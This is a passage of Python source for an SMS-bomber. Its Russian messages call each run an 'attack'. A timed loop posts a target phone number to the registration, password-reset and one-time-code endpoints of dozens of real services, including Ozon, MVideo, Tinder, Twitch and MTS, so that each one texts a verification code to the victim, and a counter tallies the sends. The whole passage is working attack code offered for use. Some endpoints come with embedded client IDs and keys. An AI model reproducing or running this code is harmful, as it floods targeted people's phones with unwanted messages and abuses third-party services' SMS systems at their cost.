        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://ontaxi.com.ua/api/v2/web/client',
                          json={"country": _codes[_code].upper(), "phone": _phone, })
            R = R + 1
            print('[+] OnTaxi Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            R = R + 1
            print('[+] Iqos Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://smart.space/api/users/request_confirmation_code/',
                          json={"mobile": "+" + _phone, "action": "confirm_mobile"})
            R = R + 1
            print('[+] Smart.Space Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.tarantino-family.com/wp-admin/admin-ajax.php',
                          data={'action': 'ajax_register_user', 'step': '1', 'security_login': '50a8c243f6',
                                'phone': _phone})
            R = R + 1
            print('[+] tarantino-family Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://apteka.ru/_action/auth/getForm/',
                          data={"form[NAME]": "", "form[PERSONAL_GENDER]": "", "form[PERSONAL_BIRTHDAY]": "",
                                "form[EMAIL]": "", "form[LOGIN]": (_phone, "+* (***) ***-**-**"),
                                "form[PASSWORD]": password, "get-new-password": "Получите пароль по SMS",
                                "user_agreement": "on", "personal_data_agreement": "on", "formType": "simple",
                                "utc_offset": "120", })
            R = R + 1
            print('[+] Apteka Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://uklon.com.ua/api/v1/account/code/send',
                          headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": _phone})
            R = R + 1
            print('[+] Uklon Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.ozon.ru/api/composer-api.bx/_action/fastEntry',
                          json={"phone": _phone, "otpId": 0})
            R = R + 1
            print('[+] Ozon Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.get('https://requests.service.banki.ru/form/960/submit',
                         params={"callback": "submitCallback", "name": _name, "phone": "+" + _phone, "email": _email,
                                 "gorod": "Москва", "approving_data": "1", })
            R = R + 1
            print('[+] Banki Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
            R = R + 1
            print('[+] IVI Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.moyo.ua/identity/registration',
                          data={"firstname": _name, "phone": _phone, "email": _email})
            R = R + 1
            print('[+] Moyo Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
            R = R + 1
            print('[+] Helsi Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.kinoland.com.ua/api/v1/service/send-sms', headers={"Agent": "website"},
                          json={"Phone": _phone, "Type": 1})
            R = R + 1
            print('[+] KinoLend Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://pizzahut.ru/account/password-reset',
                          data={'reset_by': 'phone', 'action_id': 'pass-recovery', 'phone': _phonePizzahut,
                                '_token': '*'})
            R = R + 1
            print('[+] PizzaHut Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
            R = R + 1
            print('[+] Rabota Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
            R = R + 1
            print('[+] Rutube Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Rutube in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            R = R + 1
            print('[+] Citilink Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
                          data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'})
            R = R + 1
            print('[+] Smsint Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.get(
                'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
            R = R + 1
            print('[+] oyorooms Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                          params={"pageName": "registerPrivateUserPhoneVerificatio"},
                          data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": "", })
            R = R + 1
            print('[+] MVIDEO Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
                'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone, 'typeKeys': ['Unemployed']}},
                                                              'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
            R = R + 1
            print('[+] newnext Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            R = R + 1
            print('[+] Sunlight Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone,
                                'deliveryOption': 'sms'})
            R = R + 1
            print('[+] alpari Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
            R = R + 1
            print('[+] Invitro Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://online.sbis.ru/reg/service/',
                          json={'jsonrpc': '2.0', 'protocol': '5', 'method': 'Пользователь.ЗаявкаНаФизика',
                                'params': {'phone': _phone}, 'id': '1'})
            R = R + 1
            print('[+] Sberbank Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                          params={"msisdn": _phone})
            R = R + 1
            print('[+] MTS Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.delitime.ru/api/v2/signup",
                          data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
            R = R + 1
            print('[+] Delitime Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                          data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            R = R + 1
            print('[+] ICQ Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                          data={"mode": "request", "phone": "+" + _phone, "phone_permission": "unknown", "stream_id": 0,
                                "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
            R = R + 1
            print('[+] InDriver Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                          data={"password": password, "application": "lkp", "login": "+" + _phone})
            R = R + 1
            print('[+] Invitro Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            R = R + 1
            print('[+] Pmsm Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
            R = R + 1
            print('[+] IVI Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
            R = R + 1
            print('[+] Lenta Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                          json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
            R = R + 1
            print('[+] Mail.ru Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                          params={"pageName": "registerPrivateUserPhoneVerificatio"},
                          data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
            R = R + 1
            print('[+] MVideo Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                          data={"st.r.phone": "+" + _phone})
            R = R + 1
            print('[+] OK Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
            R = R + 1
            print('[+] SMSgorod Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': _phone})
            R = R + 1
            print('[+] Tinder Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true',
                          json={"birthday": {"day": 11, "month": 11, "year": 1999},
                                "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
                                "password": password, "phone_number": _phone, "username": username})
            R = R + 1
            print('[+] Twitch Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
                          headers={'App-ID': 'cabinet'})
            R = R + 1
            print('[+] CabWiFi Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
            R = R + 1
            print('[+] wowworks Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                          json={"phone_number": "+" + _phone})
            R = R + 1
            print('[+] Eda.Yandex Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={"client_type": "personal", "email": f"{email}@gmail.ru", "mobile_phone": _phone,
                                "deliveryOption": "sms"})
            R = R + 1
            print('[+] Alpari Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
            R = R + 1
            print('[+] SMS Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
            R = R + 1
            print('[+] Delivery Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.get('https://requests.service.banki.ru/form/960/submit',
                         params={"callback": "submitCallback", "name": _name, "phone": "+" + _phone, "email": _email,
                                 "gorod": "Москва", "approving_data": "1", })
            R = R + 1
            print('[+] Banki Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        try:
            requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
            R = R + 1
            print('[+] IVI Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.moyo.ua/identity/registration',
                          data={"firstname": _name, "phone": _phone, "email": _email})
            R = R + 1
            print('[+] Moyo Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
            R = R + 1
            print('[+] Helsi Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.kinoland.com.ua/api/v1/service/send-sms', headers={"Agent": "website"},
                          json={"Phone": _phone, "Type": 1})
            R = R + 1
            print('[+] KinoLend Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://pizzahut.ru/account/password-reset',
                          data={'reset_by': 'phone', 'action_id': 'pass-recovery', 'phone': _phonePizzahut,
                                '_token': '*'})
            R = R + 1
            print('[+] PizzaHut Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
            R = R + 1
            print('[+] Rabota Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
            R = R + 1
            print('[+] Rutube Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Rutube in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            R = R + 1
            print('[+] Citilink Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
                          data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'})
            R = R + 1
            print('[+] Smsint Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.get(
                'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
            R = R + 1
            print('[+] oyorooms Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                          params={"pageName": "registerPrivateUserPhoneVerificatio"},
                          data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": "", })
            R = R + 1
            print('[+] MVIDEO Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
                'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone, 'typeKeys': ['Unemployed']}},
                                                              'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
            R = R + 1
            print('[+] newnext Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            R = R + 1
            print('[+] Sunlight Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone,
                                'deliveryOption': 'sms'})
            R = R + 1
            print('[+] alpari Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
            R = R + 1
            print('[+] Invitro Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://online.sbis.ru/reg/service/',
                          json={'jsonrpc': '2.0', 'protocol': '5', 'method': 'Пользователь.ЗаявкаНаФизика',
                                'params': {'phone': _phone}, 'id': '1'})
            R = R + 1
            print('[+] Sberbank Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                          params={"msisdn": _phone})
            R = R + 1
            print('[+] MTS Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.delitime.ru/api/v2/signup",
                          data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
            R = R + 1
            print('[+] Delitime Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                          data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            R = R + 1
            print('[+] ICQ Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                          data={"mode": "request", "phone": "+" + _phone, "phone_permission": "unknown", "stream_id": 0,
                                "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
            R = R + 1
            print('[+] InDriver Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                          data={"password": password, "application": "lkp", "login": "+" + _phone})
            R = R + 1
            print('[+] Invitro Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            R = R + 1
            print('[+] Pmsm Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
            R = R + 1
            print('[+] IVI Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
            R = R + 1
            print('[+] Lenta Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                          json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
            R = R + 1
            print('[+] Mail.ru Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
